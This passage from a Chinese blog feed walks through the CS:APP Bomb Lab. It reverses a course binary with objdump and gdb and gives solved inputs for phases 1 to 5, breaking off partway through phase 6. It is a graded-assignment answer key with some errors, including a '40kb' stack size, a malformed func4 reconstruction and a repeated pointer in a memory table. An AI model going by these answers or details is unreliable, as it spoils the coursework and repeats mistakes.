頑張ってくださいね～！</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> overflow </tag>
            
            <tag> assembly </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>csapp-Bomblab</title>
      <link href="/2019/01/12/csapp-Bomblab/"/>
      <url>/2019/01/12/csapp-Bomblab/</url>
      
        <content type="html"><![CDATA[<h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>　　这是csapp系列的第二篇文章。具体的题目请见<a href="http://csapp.cs.cmu.edu/3e/labs.html" target="_blank" rel="noopener">官网</a>。另，本文均为自己手打，可能会有不少错误。如若发现有错误或者哪里写得不清楚，欢迎联系我修改(右下角小图标点开即可对话)。<br>　　这个lab从头到尾都是自己慢慢看过来的，花了很长的时间，也不知道算不算值得吧。个人见解：看反汇编代码是真的很花时间，对着几十行的代码有的时候看了几个小时还是懵的。这个时候还是换一下心情，做点别的事，可能突然就看懂了。但也不要看到代码多就直接放弃了吧，沉下心来看，还是可以看得懂的。</p><h2 id="bomb-lab实验要求"><a href="#bomb-lab实验要求" class="headerlink" title="bomb lab实验要求"></a>bomb lab实验要求</h2><p>　　如同字面上的意思，这个实验要求我们拆一个“炸弹”。总共有六个关卡，需要保证每一个题目的输出结果都能满足某个特定的要求（答案不一定唯一），否则炸弹爆炸，游戏失败。</p><blockquote><p>实验文件：<br>bomb: 炸弹，打开后需要正确输入对应的字符串才能通关<br>bomb.c: bomb的main函数所在的文件，提供给我们进行查看</p><p>实验目的：<br>考察gdb的使用，以及reverse engneering的能力。<br>需要学会使用gdb<a href="https://www.cnblogs.com/kingos/p/4514756.html" target="_blank" rel="noopener">参考网站</a></p></blockquote><p>　　さあ、私たちの実験を始めましょう。<br>　　首先，我们需要先使用<b>objdump -d bomb &gt; bomb.txt</b>这个命令，将bomb反编译，并保存在txt文件当中，方便我们查看。然后，不妨来看一下bomb.c的代码，方便我们对整个实验有一个整体的了解。<br>　　注意看一下注释，上面告诉了我们，可以将已解决的答案放入另一个txt文件当中，运行时用<b>run &lt; answer.txt</b>将其导入，可以不用重复打。然后我们看一下整体，总共有六个字符串，每一个字符串输入后，会判断是否正确，错误则发生爆炸，正确则继续输入。看完之后，就准备进入反编译得到的文件了。　　</p><h3 id="bomb-txt"><a href="#bomb-txt" class="headerlink" title="bomb.txt"></a>bomb.txt</h3><p>　　我们先整体看一下这个文件里面有什么。文件很长，总共有一千多行，不可能每一行都去解读。我们可以利用一些小技巧帮助我们理解。如main函数，我们可以看到它分成如下的几个部分。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 读取第一个字符串</span><br><span class="line">  400e32:e8 67 06 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e37:48 89 c7             mov    %rax,%rdi</span><br><span class="line">  400e3a:e8 a1 00 00 00       callq  400ee0 &lt;phase_1&gt;</span><br><span class="line">  400e3f:e8 80 07 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e44:bf a8 23 40 00       mov    $0x4023a8,%edi</span><br><span class="line">  400e49:e8 c2 fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">// 第二个</span><br><span class="line">  400e4e:e8 4b 06 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e53:48 89 c7             mov    %rax,%rdi</span><br><span class="line">  400e56:e8 a1 00 00 00       callq  400efc &lt;phase_2&gt;</span><br><span class="line">  400e5b:e8 64 07 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e60:bf ed 22 40 00       mov    $0x4022ed,%edi</span><br><span class="line">  400e65:e8 a6 fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">// 第三个</span><br><span class="line">  400e6a:e8 2f 06 00 00       callq  40149e &lt;read_line&gt;</span><br><span class="line">  400e6f:48 89 c7             mov    %rax,%rdi</span><br><span class="line">  400e72:e8 cc 00 00 00       callq  400f43 &lt;phase_3&gt;</span><br><span class="line">  400e77:e8 48 07 00 00       callq  4015c4 &lt;phase_defused&gt;</span><br><span class="line">  400e7c:bf 0b 23 40 00       mov    $0x40230b,%edi</span><br><span class="line">  400e81:e8 8a fc ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure></p><p>　　结合bomb.c，我们应该可以很容易理解main.c的反汇编代码了。接下来，我们再看下其他函数。<br>　　1.strings_not_equal函数。名字很明显告诉了我们，这个函数是判断两个字符串是否相等的。相等则返回0<br>　　2.explode_bomb函数，注意到，其中使用了exit函数。也就是说，这个函数一旦运行，就意味着游戏失败，直接exit退出。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">000000000040143a &lt;explode_bomb&gt;:</span><br><span class="line">  40143a:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  40143e:bf a3 25 40 00       mov    $0x4025a3,%edi</span><br><span class="line">  401443:e8 c8 f6 ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401448:bf ac 25 40 00       mov    $0x4025ac,%edi</span><br><span class="line">  40144d:e8 be f6 ff ff       callq  400b10 &lt;puts@plt&gt;</span><br><span class="line">  401452:bf 08 00 00 00       mov    $0x8,%edi</span><br><span class="line">  401457:e8 c4 f7 ff ff       callq  400c20 &lt;exit@plt&gt;</span><br></pre></td></tr></table></figure></p><p>　　3.read_line函数。由名字我们也可以知道，这个函数就是为了读取一行字符串。<br>　　4.read_six_numbers函数。由名字，我们知道，这个函数就是用来读六个数字。注意代码中用到了sscanf函数，用于从某一个字符串中格式化读取。其中%rdi存放的是待读取字符串，%rsi存储的是用于格式化的串，后面跟着的都是变量的地址。如sscanf(“7 0”, “%d %d”, &amp;a,  &amp;b)，返回值为成功读取的变量个数。<br>　　5.phase_1 phase_2 … 用于判断输入的字符串是否满足要求</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0000000000400ee0 &lt;phase_1&gt;:</span><br><span class="line">  400ee0:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400ee4:be 00 24 40 00       mov    $0x402400,%esi</span><br><span class="line">  400ee9:e8 4a 04 00 00       callq  401338 &lt;strings_not_equal&gt; // 直接判断与0x402400位置的字符串是否相同</span><br><span class="line">  400eee:85 c0                test   %eax,%eax</span><br><span class="line">  400ef0:74 05                je     400ef7 &lt;phase_1+0x17&gt;</span><br><span class="line">  400ef2:e8 43 05 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  400ef7:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  400efb:c3                   retq</span><br></pre></td></tr></table></figure><p>　　题目很短，难度也很小，就是将读取的字符串直接与首地址为0x402400的字符串作比较，若相同则返回，否则引爆炸弹。因此，我们需要知道0x402400中究竟放着什么字符串。直接从反汇编代码中没办法看出来，这个时候就要用到强大的gdb了。需要用到x命令。语法为: <b>x/&lt;n/f/u&gt; <addr> </addr></b><br>　　其中，n是一个正整数，表示需要显示的内存单元的个数。每个内存单元的大小与u相关。u表示每个单元的大小。f表示输出的格式。较常用的如下。<br>　　x 按十六进制格式输出<br>　　d 按十进制格式输出<br>　　t 按二进制格式输出<br>　　c 按字符格式输出<br>　　如：x/10c 0x402400 将以字符形式输出从0x402400开始的十个字节<br>　　x/10xw 0x402400 将以字符形式输出从0x402400开始的十个单元，每个单元为4个字节<br>　　具体的使用自己试一试就知道了。我们直接查看内存后就发现，对应的字符串为： Border relations with Canada have never been better. 第一题结束。</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>　　第二题，长度明显加长了一些。我们可以试着将其分段解读。至于从哪里开始分的话，尽量是选择jmp类的命令所在的行或者jmp命令跳转到的行，这种地方有可能是for循环，或者条件分支语句的结尾。就第二题来说，我们可以将其分成两个部分。第一个部分如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">400efe:48 83 ec 28          sub    $0x28,%rsp                 // 分配40kb的内存空间</span><br><span class="line">400f02:48 89 e6             mov    %rsp,%rsi</span><br><span class="line">400f05:e8 52 05 00 00       callq  40145c &lt;read_six_numbers&gt;  // 将空间传给函数，读取六个数字</span><br><span class="line">400f0a:83 3c 24 01          cmpl   $0x1,(%rsp)                // 判断第一个数字是否为1</span><br><span class="line">400f0e:74 20                je     400f30 &lt;phase_2+0x34&gt;      // 为1，跳开；否则，引爆炸弹</span><br><span class="line">400f10:e8 25 05 00 00       callq  40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure></p><p>　　第二个部分如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">400f17:8b 43 fc             mov    -0x4(%rbx),%eax</span><br><span class="line">400f1a:01 c0                add    %eax,%eax                   // 取出下一个数字，并*2</span><br><span class="line">400f1c:39 03                cmp    %eax,(%rbx)                 // 判断每一个数字是否为上一个数字的两倍</span><br><span class="line">400f1e:74 05                je     400f25 &lt;phase_2+0x29&gt;       // 是，跳开；不是，爆炸</span><br><span class="line">400f20:e8 15 05 00 00       callq  40143a &lt;explode_bomb&gt;       // 循环体内部，依次判断输入是否正确</span><br><span class="line">400f25:48 83 c3 04          add    $0x4,%rbx</span><br><span class="line">400f29:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">400f2c:75 e9                jne    400f17 &lt;phase_2+0x1b&gt;</span><br></pre></td></tr></table></figure></p><p>　　于是我们发现，整个程序对我们的要求有三个：<br>　　1.输入六个数字<br>　　2.第一个数字是1<br>　　3.第二个数字开始，每一个数字是前一个的两倍<br>　　由此，我们可以得到结果为：1， 2， 4， 8， 16， 32</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>　　第三题，题目又变长了一些。在<b>400f65</b>之前，就是用sscanf读入两个数字。也就是说这次我们需要输入两个满足特定关系的数字。<br>　　再接下来的三行，程序判断输入的第一个数字是否大于小于等于7，否则爆炸。<br>　　接下来一行是重点了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">400f75:ff 24 c5 70 24 40 00 jmpq   *0x402470(,%rax,8)</span><br></pre></td></tr></table></figure></p><p>　　这个代码是什么意思呢？注意<em>号的作用,该指令跳转的目标点是地址为0x402470+8</em>%rax的内存单元。因此，我们需要打印出来0x402470+8i的值，对照代码后会发现，其实源代码应该就是一个<b>switch</b>函数。再看下接下来的几行代码，基本都是这样的格式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">400f7c:b8 cf 00 00 00       mov    $0xcf,%eax</span><br><span class="line">400f81:eb 3b                jmp    400fbe &lt;phase_3+0x7b&gt;</span><br></pre></td></tr></table></figure></p><p>　　也就是说，根据你所输入的第一个数，你的第二个数需要对应这跳转目标点mov赋的值。为了简单起见，笔者直接打印0x402470，得到答案。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// b为我们输入的第一个数字，v为我们输入的第二个数字。</span></span><br><span class="line"><span class="keyword">int</span> a;</span><br><span class="line"><span class="keyword">switch</span>(b) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>: a = ...</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>: a = ...</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>: a = ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (a != v) explode_bomb();</span><br></pre></td></tr></table></figure></p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>　　这道题看起来难度并不大。前面我们已经做了三道题了，基本上开始能够看懂一些复杂一点点的代码。phase_3函数应该也就不成问题了。首先输入两个数字，第二个数字必须为0，第一个数字将放入func4函数当中。也就是说，我们目的就是看懂func4这个函数在干什么。然后根据函数推断出我们需要输入的第一个数字即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">400fd6:89 c1                mov    %eax,%ecx</span><br><span class="line">400fd8:c1 e9 1f             shr    $0x1f,%ecx</span><br><span class="line">400fdb:01 c8                add    %ecx,%eax</span><br><span class="line">400fdd:d1 f8                sar    %eax</span><br></pre></td></tr></table></figure></p><p>　　首先，上面这个部分一开始让我迷惑了很久，这是要干嘛？？其中shr向右移动31位只有两个结果，当%ecx的值大于等于0时，得到结果为0，否则得到-1。因此这几行其实是当%eax的值小于0的时候就减去1。最后再向又移一位（缺省则位移一位）。<br>　　再接下来这段笔者看了特别久，最后是采用尝试着打出源代码才理解的。如果有跟我一样的看不太懂的，也不妨试试这个办法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">400fdf:8d 0c 30             lea    (%rax,%rsi,1),%ecx</span><br><span class="line"> 400fe2:39 f9                cmp    %edi,%ecx</span><br><span class="line"> 400fe4:7e 0c                jle    400ff2 &lt;func4+0x24&gt;</span><br><span class="line"> 400fe6:8d 51 ff             lea    -0x1(%rcx),%edx</span><br><span class="line"> 400fe9:e8 e0 ff ff ff       callq  400fce &lt;func4&gt;</span><br><span class="line"></span><br><span class="line"> 400fee:01 c0                add    %eax,%eax</span><br><span class="line"> 400ff0:eb 15                jmp    401007 &lt;func4+0x39&gt;</span><br><span class="line"></span><br><span class="line"> 400ff2:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line"> 400ff7:39 f9                cmp    %edi,%ecx</span><br><span class="line"> 400ff9:7d 0c                jge    401007 &lt;func4+0x39&gt;</span><br><span class="line"></span><br><span class="line"> 400ffb:8d 71 01             lea    0x1(%rcx),%esi</span><br><span class="line"> 400ffe:e8 cb ff ff ff       callq  400fce &lt;func4&gt;</span><br><span class="line"> 401003:8d 44 00 01          lea    0x1(%rax,%rax,1),%eax</span><br></pre></td></tr></table></figure></p><p>　　如上，将其通过跳转指令划分为4个部分。然后我们发现它调用了自己，也就是说这是一个递归函数。注意到phase_4调用它之前放入了3个参数。我们可以尝试着打出源代码。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// a为我们输入的数，b初始为0，c初始值为15。我们需要返回的值是0。因此，只需要让一开始tt就等于a即可</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b, <span class="keyword">int</span> c)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t = c-b;</span><br><span class="line">    <span class="keyword">if</span>(t&lt;<span class="number">0</span>) t--;</span><br><span class="line">    t&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> tt=t+b;</span><br><span class="line">    <span class="keyword">if</span>(tt&gt;a) c=tt<span class="number">-1</span>; <span class="keyword">return</span> <span class="number">2</span>*func4(a,b,c);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (tt==a) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> <span class="number">2</span>*func4(a,tt+<span class="number">1</span>,c)+<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>　　这道题长度又一次增加了，不过好在难度还不算太大。其实能做完第四题的话做第五题问题应该是不大的。和之前一样。我们先尝试着将整个代码拆分成几个部分。<br>　　首先，要求我们输入的应该是一个字符串，且长度必须为6。接下来的几行是一个循环，我们先跳过。先看最后面的几行代码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">4010ae:c6 44 24 16 00       movb   $0x0,0x16(%rsp)</span><br><span class="line">4010b3:be 5e 24 40 00       mov    $0x40245e,%esi</span><br><span class="line">4010b8:48 8d 7c 24 10       lea    0x10(%rsp),%rdi</span><br><span class="line">4010bd:e8 76 02 00 00       callq  401338 &lt;strings_not_equal&gt;</span><br></pre></td></tr></table></figure></p><p>　　上面几行将栈上面位于%rsp+10～%rsp+15的字符串与首地址为0x40245e的字符串相比较，打印地址后我们看到，字符串为flyers，也就是说我们的输入经过变换之后要变成flyers这个字符串。这个时候我们再回去看一下循环体内部是怎样做变换的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">40108b:0f b6 0c 03          movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">40108f:88 0c 24             mov    %cl,(%rsp)</span><br><span class="line">401092:48 8b 14 24          mov    (%rsp),%rdx</span><br><span class="line">401096:83 e2 0f             and    $0xf,%edx</span><br><span class="line">401099:0f b6 92 b0 24 40 00 movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">4010a0:88 54 04 10          mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">4010a4:48 83 c0 01          add    $0x1,%rax</span><br><span class="line">4010a8:48 83 f8 06          cmp    $0x6,%rax</span><br><span class="line">4010ac:75 dd                jne    40108b &lt;phase_5+0x29&gt;</span><br></pre></td></tr></table></figure></p><p>　　注意到这一段代码，一次取出每一个字符。并将其与0xf相与，也就是说我们取出后四位的值c，再加上0x4024b0得到一个值v，再取出内存地址为v的值，放入栈当中。这样说可能有点难理解。我们来举一个例子。比如第一个字符串处理之后要变成’f’，查询ASCII得，相当与102，也就是0x66, 再查看一下内存，看到‘f’位于0x4024b9。因此我们需要的c的值为9，为了方便，我第一个字符输入的是i(0x69),和0xf相与之后恰好为9，满足要求。后面的同理，不再赘述。由此，本题成功解决了。</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>　　这道题可以说是有点丧心病狂了。难度和之前感觉完全不在一个档次上。不过毕竟是压轴题，也可以理解。同样的，我们先将代码拆分成几个小部分。<br>　　首先，题目读取了六个数字。然后需要对这六个数字做出相当长的处理。下面的这一段应该是目前为止最难理解的一个点。如果无法理解，还请多看几遍。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">// 下面为一个嵌套循环，终止条件为r12 == 6 目的为检测是否所有字符均不相等以及小于等于6</span><br><span class="line">// %eax = a[i] (%r13)</span><br><span class="line">// %rbp = &amp;a[i]</span><br><span class="line">401114:4c 89 ed             mov    %r13,%rbp</span><br><span class="line">401117:41 8b 45 00          mov    (%r13),%eax</span><br><span class="line">40111b:83 e8 01             sub    $0x1,%eax</span><br><span class="line">40111e:83 f8 05             cmp    $0x5,%eax</span><br><span class="line">401121:76 05                jbe    401128 &lt;phase_6+0x34&gt;  // a[i] &gt; 6 爆炸</span><br><span class="line">401123:e8 12 03 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401128:41 83 c4 01          add    $0x1,%r12d</span><br><span class="line">40112c:41 83 fc 06          cmp    $0x6,%r12d</span><br><span class="line">401130:74 21                je     401153 &lt;phase_6+0x5f&gt;   // %r12 == 6 退出循环</span><br><span class="line">// 第二层循环</span><br><span class="line">401132:44 89 e3             mov    %r12d,%ebx</span><br><span class="line">401135:48 63 c3             movslq %ebx,%rax</span><br><span class="line">401138:8b 04 84             mov    (%rsp,%rax,4),%eax</span><br><span class="line">40113b:39 45 00             cmp    %eax,0x0(%rbp)</span><br><span class="line">40113e:75 05                jne    401145 &lt;phase_6+0x51&gt;   // a[i] != a[i+j] 否则爆炸</span><br><span class="line">401140:e8 f5 02 00 00       callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">401145:83 c3 01             add    $0x1,%ebx</span><br><span class="line">401148:83 fb 05             cmp    $0x5,%ebx</span><br><span class="line">40114b:7e e8                jle    401135 &lt;phase_6+0x41&gt;</span><br><span class="line">// 第二层循环外</span><br><span class="line">40114d:49 83 c5 04          add    $0x4,%r13</span><br><span class="line">401151:eb c1                jmp    401114 &lt;phase_6+0x20&gt;</span><br></pre></td></tr></table></figure></p><p>　　接下来的部分就比较好理解了。最终对整个程序的影响是将每一个值a[i]转化为7-a[i]。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">401153:48 8d 74 24 18       lea    0x18(%rsp),%rsi</span><br><span class="line">401158:4c 89 f0             mov    %r14,%rax</span><br><span class="line">40115b:b9 07 00 00 00       mov    $0x7,%ecx</span><br><span class="line">401160:89 ca                mov    %ecx,%edx</span><br><span class="line">401162:2b 10                sub    (%rax),%edx</span><br><span class="line">401164:89 10                mov    %edx,(%rax)  // a[i] = 7 - a[i]</span><br><span class="line">401166:48 83 c0 04          add    $0x4,%rax</span><br><span class="line">40116a:48 39 f0             cmp    %rsi,%rax</span><br><span class="line">40116d:75 f1                jne    401160 &lt;phase_6+0x6c&gt;</span><br></pre></td></tr></table></figure></p><p>　　再接下来这一段就比较麻烦了。和之前一样，我采用了尝试这打出源代码的方法进行理解。由于接下来的两段代码经常要访问内存，为了方便理解，我将内存代码打出来，欢迎查阅。</p><table><thead><tr><th></th><th>address</th><th>address + 4</th><th>address + 8</th><th>address + 12</th></tr></thead><tbody><tr><td>0x6032d0</td><td>0x0000014c</td><td>0x00000001</td><td>0x006032e0</td><td>0x00000000</td></tr><tr><td>0x6032e0</td><td>0x000000a8</td><td>0x00000002</td><td>0x006032f0</td><td>0x00000000</td></tr><tr><td>0x6032f0</td><td>0x0000039c</td><td>0x00000003</td><td>0x00603300</td><td>0x00000000</td></tr><tr><td>0x603300</td><td>0x000002b3</td><td>0x00000004</td><td>0x00603300</td><td>0x00000000</td></tr><tr><td>0x603310</td><td>0x000001dd</td><td>0x00000005</td><td>0x00603320</td><td>0x00000000</td></tr><tr><td>0x603320</td><td>0x000001bb</td><td>0x00000006</td><td>0x00000000</td><td>0x00000000</td></tr></tbody></table><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">401176:48 8b 52 08          mov    0x8(%rdx),%rdx</span><br><span class="line">40117a:83 c0 01             add    $0x1,%eax</span><br><span class="line">40117d:39 c8                cmp    %ecx,%eax</span><br><span class="line">40117f:75 f5                jne    401176 &lt;phase_6+0x82&gt;</span><br><span class="line">401181:eb 05                jmp    401188 &lt;phase_6+0x94&gt;</span><br><span class="line">401183:ba d0 32 60 00       mov    $0x6032d0,%edx</span><br><span class="line">401188:48 89 54 74 20       mov    %rdx,0x20(%rsp,%rsi,2)</span><br><span class="line">40118d:48 83 c6 04          add    $0x4,%rsi</span><br><span class="line">401191:48 83 fe 18          cmp    $0x18,%rsi</span><br><span class="line">401195:74 14                je     4011ab &lt;phase_6+0xb7&gt;</span><br><span class="line">401197:8b 0c 34             mov    (%rsp,%rsi,1),%ecx</span><br><span class="line">40119a:83 f9 01             cmp    $0x1,%ecx</span><br><span class="line">40119d:7e e4                jle    401183 &lt;phase_6+0x8f&gt;</span><br><span class="line">40119f:b8 01 00 00 00       mov    $0x1,%eax</span><br><span class="line">4011a4:ba d0 32 60 00       mov    $0x6032d0,%edx</span><br><span class="line">4011a9:eb cb                jmp    401176 &lt;phase_6+0x82&gt;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">　<span class="comment">// %rsi : 4 * i</span></span><br><span class="line">  <span class="comment">// %eax : 用于和a[i]做比较</span></span><br><span class="line">  <span class="comment">// %ecx : a[i]</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (a[i]&lt;=<span class="number">1</span>) &#123;</span><br><span class="line">        M[%rsp + <span class="number">8</span> * i + <span class="number">32</span>] = <span class="number">0x6032d0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// 经查看内存可得</span></span><br><span class="line">        M[%rsp + <span class="number">8</span> * i + <span class="number">32</span>] = <span class="number">0x6032d0</span> + <span class="number">16</span> * (a[i]<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　关于上面的这段函数，我们可以理解为它在构造一个结构体Node(注意，指针为64位，且为小端)，其中Node的成员如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Node &#123;</span><br><span class="line">  <span class="keyword">int</span> value;</span><br><span class="line">  <span class="keyword">int</span> id;</span><br><span class="line">  Node* next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　倘若我们这样看，会发现整个代码容易理解了很多，结合具体内存中的值，我们发现，下面的这一段其实就是将各个结构体元素连接起来，形成一个链表。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">4011ab:48 8b 5c 24 20       mov    0x20(%rsp),%rbx</span><br><span class="line">4011b0:48 8d 44 24 28       lea    0x28(%rsp),%rax</span><br><span class="line">4011b5:48 8d 74 24 50       lea    0x50(%rsp),%rsi</span><br><span class="line">4011ba:48 89 d9             mov    %rbx,%rcx</span><br><span class="line">4011bd:48 8b 10             mov    (%rax),%rdx</span><br><span class="line">4011c0:48 89 51 08          mov    %rdx,0x8(%rcx)</span><br><span class="line">4011c4:48 83 c0 08          add    $0x8,%rax</span><br><span class="line">4011c8:48 39 f0             cmp    %rsi,%rax</span><br><span class="line">4011cb:74 05                je     4011d2 &lt;phase_6+0xde&gt;</span><br><span 